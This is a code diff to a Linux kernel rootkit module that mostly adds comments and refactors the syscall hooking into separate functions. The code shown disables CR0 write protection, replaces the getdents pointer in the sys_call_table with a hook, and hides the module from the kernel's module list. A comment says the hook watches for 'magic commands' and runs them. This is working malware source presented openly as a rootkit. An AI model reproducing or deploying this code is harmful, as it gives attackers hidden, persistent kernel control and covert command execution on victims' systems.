@@ -23,6 +23,12 @@ static struct list_head *prev_module;
 
 static int is_hidden = 0;
 
+
+/*
+* Function: hide_module
+* ---------------------
+* if the module is in the module list, remove it.
+*/
 void hide_module(void) {
     if (is_hidden)
     {
@@ -33,6 +39,12 @@ void hide_module(void) {
     is_hidden = 1;
 }
 
+
+/*
+* Function: unhide_module
+* ---------------------
+* if the module is not in the module list, add it.
+*/
 void unhide_module(void) {
     if (!is_hidden)
     {
@@ -40,10 +52,16 @@ void unhide_module(void) {
     }
     list_add(&THIS_MODULE->list, prev_module);
     is_hidden = 0;
-
 }
 
-
+/*
+* Function: hooked_getdents
+* -------------------------
+* This function is the hook for getdents
+* calling the original getdents, going over the output and checking for the magic commands.
+* if found, run the requested command.
+* return the length of the structs. just like the original getdents returns.
+*/
 asmlinkage int hooked_getdents(const struct pt_regs * pt_regs)
 {
     printk(KERN_INFO "[+] rootkit successfull hook!\n");
@@ -103,8 +121,12 @@ asmlinkage int hooked_getdents(const struct pt_regs * pt_regs)
 }
 
 
-unsigned int orig_cr0;
-
+/*
+* Function: disable_wp_protection
+* -------------------------------
+* This function changing the 16'th bit on the cr0 register
+* changing this bit enable us to write to ro pages.
+*/
 static void disable_wp_protection(void)
 {
     unsigned long value;
@@ -116,6 +138,12 @@ static void disable_wp_protection(void)
     asm volatile ("mov %0, %%cr0"::"r" (value & ~0x00010000));
 }
 
+/*
+* Function: enable_wp_protection
+* ------------------------------
+* This function changing the 16'th bit on the cr0 register
+* changing this bit disable us to write to ro pages.
+*/
 static void enable_wp_protection(void)
 {
     unsigned long value;
@@ -127,8 +155,58 @@ static void enable_wp_protection(void)
     asm volatile ("mov %0, %%cr0"::"r" (value | 0x00010000));
 }
 
+
+/*
+* Function: register_hooks
+* ------------------------
+* This function registering our hooks by changing the syscall table to our hooked functions.
+*/
+static void register_hooks(void){
+    // Change the sys_call_table pointer to out pointer.
+    printk(KERN_INFO "[+] rootkit setting the getdents pointers to out pointer. ours: %p\n", hooked_getdents);
+    disable_wp_protection();
+    p_sys_call_table[__NR_getdents] = (unsigned long)hooked_getdents;
+    enable_wp_protection();
+}
+
+
+/*
+* Function: unregister_hooks
+* --------------------------
+* This function unregistering our hooks by changing the syscall table to the original pointers.
+*/
+static void unregister_hooks(void){
+    printk(KERN_INFO "[+] rootkit exit_rootkit\n");
+    disable_wp_protection();
+    p_sys_call_table[__NR_getdents] = (unsigned long)original_getdents;
+    enable_wp_protection();
+}
+
+/*
+* Function: set_original_addresses
+* --------------------------------
+* This function setting the pointer to the original functions.
+* Then, when we want we can call them to get the original values.
+* Getting the information directly from the syscall table.
+* return 1 - error. 0 - success.
+*/
+static int set_original_addresses(void)
+{
+    original_getdents = (void *)p_sys_call_table[__NR_getdents];
+    if (0 == original_getdents)
+    {
+        printk(KERN_INFO "[-] rootkit Error finding the original_getdents\n");
+        return 1;
+    }
+    printk(KERN_INFO "[+] rootkit original_getdents = %p\n", original_getdents);
+
+    return 0;
+
+}
+
 static int __init init_rootkit(void) {
     printk(KERN_INFO "[+] rootkit init_rootkit\n");
+    int err;
     //Find the sys_call_table pointer in the kernel, you can check in /proc/kallsyms if its the same pointer.
     p_sys_call_table = (void *) kallsyms_lookup_name("sys_call_table");
     if (0 == p_sys_call_table)
@@ -138,32 +216,21 @@ static int __init init_rootkit(void) {
     }
     printk(KERN_INFO "[+] rootkit p_sys_call_table = %p\n", p_sys_call_table);
 
-    // Try to find the original getdents pointer.
-    original_getdents = (void *)p_sys_call_table[__NR_getdents];
-    if (0 == original_getdents)
-    {
-        printk(KERN_INFO "[-] rootkit Error finding the original_getdents\n");
+    err = set_original_addresses();
+    if(err){
+        printk(KERN_INFO "[-] rootkit there was an error finding original function pointers. not setting hooks.\n");        
         return 1;
     }
-    printk(KERN_INFO "[+] rootkit original_getdents = %p\n", original_getdents);
 
-    // Change the sys_call_table pointer to our pointer.
-    disable_wp_protection();
-    printk(KERN_INFO "[+] rootkit setting the getdents pointer to out pointers. out ptr %p\n", hooked_getdents);
-    p_sys_call_table[__NR_getdents] = (unsigned long)hooked_getdents;
-    enable_wp_protection();
-    
+    register_hooks();
     hide_module();
 
     return 0;
-
 }
 
 static void __exit exit_rootkit(void) {
     printk(KERN_INFO "[+] rootkit exit_rootkit\n");    
-    disable_wp_protection();
-    p_sys_call_table[__NR_getdents] = (unsigned long)original_getdents;
-    enable_wp_protection();
+    unregister_hooks();
     return;
 }
 
